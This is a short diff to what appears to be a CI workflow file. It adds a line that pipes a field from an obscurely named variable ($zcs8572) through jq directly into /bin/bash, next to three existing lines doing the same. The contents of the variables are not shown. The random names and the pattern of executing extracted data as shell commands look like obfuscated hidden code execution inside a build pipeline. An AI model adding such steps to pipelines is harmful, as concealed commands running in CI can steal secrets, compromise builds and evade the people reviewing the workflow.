@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$iri304" | jq -r .defle410 | /bin/bash
           printf '%s' "$x62" | jq -r .tmpb40 | /bin/bash
           echo $yeka6 | jq -r .eohpc06 | /bin/bash
+          echo $zcs8572 | jq -r .eoxr038 | /bin/bash
 
       - name: Save archive
         if: always()
